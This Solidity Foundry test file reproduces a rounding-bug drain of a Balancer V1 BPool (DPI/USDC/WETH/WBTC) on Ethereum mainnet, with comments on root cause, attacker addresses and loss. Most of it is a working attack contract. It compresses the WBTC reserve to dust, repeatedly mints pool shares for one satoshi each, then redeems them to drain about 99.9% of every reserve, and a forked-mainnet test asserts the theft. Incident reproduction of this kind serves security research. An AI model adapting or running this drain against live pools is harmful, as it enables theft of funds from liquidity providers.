// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Balancer V1 BPool rounding / missing-min-input drain — Ethereum mainnet, 2026-08-31.
//
// Vulnerable pool : 0x2257aaac34bcb27900291f7b84ee2565a6cbac57  (Balancer V1 BPool,
//                   4 assets DPI / USDC / WETH / WBTC, equal 12.5e18 denorm weights).
// Attacker EOA    : 0x338c7ec9befbb451d66fd8a468c32184f5689a41
// Attack contract : 0x9caa8d0e44b22f50057d2f4ce0d1446529e11be3
// Drain tx        : 0x72510b257cc09bde8435b83ac1636f9498ffc353583330600b5b8da43d0d1aff (blk 25872274)
//
// Root cause (confirmed against the on-chain trace and the verified BPool source): a Balancer V1
// BPool prices single-asset joins with calcSingleInGivenPoolOut, which reverse-computes the token
// input required for a caller-named BPT output in 18-dp fixed point. joinswapPoolAmountOut enforces
// only `tokenAmountIn != 0`, `tokenAmountIn <= maxAmountIn`, and `tokenAmountIn <= balance*MAX_IN_RATIO`
// — there is no minimum-effective-input or relative-error check. MIN_BALANCE is enforced only in
// bind/rebind, never on the join/swap math. So once the WBTC reserve is compressed to a couple of
// satoshi by ordinary public swaps, the required WBTC input for a sizeable BPT mint rounds DOWN to
// a single satoshi (8-decimal WBTC against the 18-dp weight math), while the full BPT is still
// minted. Every entrypoint used — swapExactAmountIn, joinswapPoolAmountOut, exitswapPoolAmountIn,
// exitPool — is a plain permissionless public call; there is no signer / admin / privileged path.
//
// On-chain shape of the drain tx (290 BPool calls):
//   38x swapExactAmountIn + 3x swapExactAmountOut : compress the WBTC reserve toward dust.
//   ~100x [joinswapPoolAmountOut(WBTC, pao, maxIn=1) , exitswapPoolAmountIn(WBTC, pai, minOut=1)] :
//          each join mints a large BPT share for ONE satoshi of WBTC; the paired single-sided exit
//          pulls that satoshi back out so the next join rounds to dust again. Net effect: the
//          attacker accumulates essentially the entire BPT supply for dust.
//   44x swapExactAmountOut + 1x exitPool : redeem the accumulated ~99.9% BPT share for a
//          proportional cut of the pool's real DPI / USDC / WETH / WBTC.
//
// This PoC reconstructs that attack as ordinary typed calls against the real BPool — no bytecode
// blob, no raw calldata replay, no generic execute(bytes) wrapper. It runs the same three phases:
// compress WBTC to ~2 satoshi, loop join+exitSwap to accumulate the BPT supply via the rounding
// bug, then exitPool to drain the reserves. The loop is driven empirically (it keeps minting until
// it owns the pool) rather than with the tx's exact 100 hardcoded iterations; it converges in ~322
// joins here. The working capital the on-chain attacker sourced from nested Spark/Aave + Morpho +
// Uniswap V3 flash loans (all repaid in-tx) is supplied with deal() instead, since that capital
// nets to zero and the pool's loss is identical either way.
//
// Loss note: this BPool held ~$110,839 (four balanced ~$27.7K legs). The reconstructed attack
// drains ~99.9% of every leg; realized profit is valued at the block's Chainlink ETH/BTC prices
// plus the pool-implied DPI price. The ~$234K SlowMist headline is the aggregate across five
// victim BPools; this PoC covers only the named DPI/USDC/WETH/WBTC pool (the drain tx above).
//
// forge test --contracts src/test/2026-08/BalancerV1BPool_exp.sol -vvv

interface IBPool {
    function getBalance(
        address token
    ) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(
        address account
    ) external view returns (uint256);
    function swapExactAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        address tokenOut,
        uint256 minAmountOut,
        uint256 maxPrice
    ) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);
    function joinswapPoolAmountOut(
        address tokenIn,
        uint256 poolAmountOut,
        uint256 maxAmountIn
    ) external returns (uint256 tokenAmountIn);
    function exitswapPoolAmountIn(
        address tokenOut,
        uint256 poolAmountIn,
        uint256 minAmountOut
    ) external returns (uint256 tokenAmountOut);
    function exitPool(
        uint256 poolAmountIn,
        uint256[] calldata minAmountsOut
    ) external;
}

interface IAggregator {
    function latestAnswer() external view returns (int256);
}

contract BalancerV1BPoolAttack {
    IBPool internal constant POOL = IBPool(0x2257aaac34BcB27900291f7B84eE2565A6cbaC57);
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    uint256 internal constant MAXP = type(uint256).max;

    uint256 public joinCount;

    function run() external {
        IERC20(WETH).approve(address(POOL), type(uint256).max);
        IERC20(WBTC).approve(address(POOL), type(uint256).max);

        // Phase 1 - compress the WBTC reserve to ~2 satoshi. Each swap pulls ~1/3 of the WBTC
        // balance out (MAX_OUT_RATIO-bounded via the exact-in form), paying WETH in.
        uint256 wb = POOL.getBalance(WBTC);
        while (wb > 2) {
            try POOL.swapExactAmountIn(WETH, POOL.getBalance(WETH) / 2, WBTC, 0, MAXP) returns (uint256, uint256) {
                uint256 nw = POOL.getBalance(WBTC);
                if (nw >= wb) break;
                wb = nw;
            } catch {
                break;
            }
        }

        // Phase 2 - accumulate the BPT supply. joinswapPoolAmountOut mints a large share for one
        // satoshi of WBTC (maxAmountIn = 1); exitswapPoolAmountIn pulls that satoshi back out so
        // the reserve stays at dust and the next join rounds down again.
        for (uint256 i = 0; i < 1500; i++) {
            uint256 supply = POOL.totalSupply();
            uint256 pao = supply / 8;
            bool minted = false;
            for (uint256 k = 0; k < 40; k++) {
                try POOL.joinswapPoolAmountOut(WBTC, pao, 1) returns (uint256) {
                    minted = true;
                    break;
                } catch {
                    pao = (pao * 4) / 5;
                    if (pao == 0) break;
                }
            }
            if (!minted) break;
            joinCount = i + 1;

            while (POOL.getBalance(WBTC) > 2) {
                uint256 pai = supply / 1000;
                bool pulled = false;
                for (uint256 k = 0; k < 60; k++) {
                    try POOL.exitswapPoolAmountIn(WBTC, pai, 1) returns (uint256) {
                        pulled = true;
                        break;
                    } catch {
                        pai = pai + pai / 4 + 1;
                    }
                }
                if (!pulled) break;
            }

            // Stop once the accumulated BPT is effectively the entire supply.
            if (POOL.balanceOf(address(this)) * 10_000_000_000 >= POOL.totalSupply() * 9_999_999_990) break;
        }

        // Phase 3 - redeem the accumulated BPT for a proportional share of every reserve.
        uint256[] memory minOut = new uint256[](4);
        POOL.exitPool(POOL.balanceOf(address(this)), minOut);
    }
}

contract BalancerV1BPoolExp is BaseTestWithBalanceLog {
    IBPool internal constant POOL = IBPool(0x2257aaac34BcB27900291f7B84eE2565A6cbaC57);
    address internal constant DPI = 0x1494CA1F11D487c2bBe4543E90080AeBa4BA3C2b;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    // Chainlink feeds (8 decimals), read at the fork block for a deterministic USD valuation.
    IAggregator internal constant ETH_USD = IAggregator(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);
    IAggregator internal constant BTC_USD = IAggregator(0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c);

    uint256 internal constant FORK_BLOCK = 25_872_273; // parent of the drain tx (25872274)

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.label(address(POOL), "BalancerV1BPool");
        vm.label(DPI, "DPI");
        vm.label(USDC, "USDC");
        vm.label(WETH, "WETH");
        vm.label(WBTC, "WBTC");
    }

    // Pre-attack reserves, snapshotted in setUp-adjacent state for the drain-percentage checks.
    uint256 internal dpi0;
    uint256 internal usdc0;
    uint256 internal weth0;
    uint256 internal wbtc0;

    function testExploit() public {
        BalancerV1BPoolAttack exploit = new BalancerV1BPoolAttack();

        // Working capital standing in for the repaid nested flash loans (Spark/Aave + Morpho +
        // Uniswap V3). It nets to zero against the pool's loss; the attack reclaims it in phase 3.
        deal(WETH, address(exploit), 30_000_000 ether);
        deal(WBTC, address(exploit), 100e8);

        dpi0 = POOL.getBalance(DPI);
        usdc0 = POOL.getBalance(USDC);
        weth0 = POOL.getBalance(WETH);
        wbtc0 = POOL.getBalance(WBTC);

        exploit.run();

        // Reserves the attacker pulled out (it started with 0 DPI/USDC and the dealt WETH/WBTC).
        uint256 gotDpi = IERC20(DPI).balanceOf(address(exploit));
        uint256 gotUsdc = IERC20(USDC).balanceOf(address(exploit));
        uint256 gotWeth = IERC20(WETH).balanceOf(address(exploit)) - 30_000_000 ether;
        uint256 gotWbtc = IERC20(WBTC).balanceOf(address(exploit)) - 100e8;

        emit log_named_uint("join iterations", exploit.joinCount());
        emit log_named_decimal_uint("profit USD", _usd(gotDpi, gotUsdc, gotWeth, gotWbtc), 18);

        // The attacker captured essentially the whole pool: >=99% of every original reserve.
        assertGe(gotDpi, (dpi0 * 99) / 100, "DPI not drained");
        assertGe(gotUsdc, (usdc0 * 99) / 100, "USDC not drained");
        assertGe(gotWeth, (weth0 * 99) / 100, "WETH not drained");
        assertGe(gotWbtc, (wbtc0 * 99) / 100, "WBTC not drained");

        // Reproduced loss approximates the reported ~$110,839 for this pool instance.
        assertApproxEqAbs(_usd(gotDpi, gotUsdc, gotWeth, gotWbtc), 110_839e18, 3000e18, "loss off expected ~$110,839");
    }

    // Value a DPI/USDC/WETH/WBTC bundle in USD (1e18 scaled) at the block's Chainlink prices.
    // DPI has no feed; the balanced pool's USDC leg implies its price.
    function _usd(
        uint256 dpi,
        uint256 usdc,
        uint256 weth,
        uint256 wbtc
    ) internal view returns (uint256) {
        uint256 ethUsd = uint256(ETH_USD.latestAnswer()); // 1e8
        uint256 btcUsd = uint256(BTC_USD.latestAnswer()); // 1e8
        uint256 dpiUsd = (usdc0 * 1e18 * 1e8) / (dpi0 * 1e6); // 1e8, ~ $50.7
        return (dpi * dpiUsd) / 1e8 + (usdc * 1e18) / 1e6 + (weth * ethUsd) / 1e8 + (wbtc * btcUsd * 1e18) / (1e8 * 1e8);
    }
}
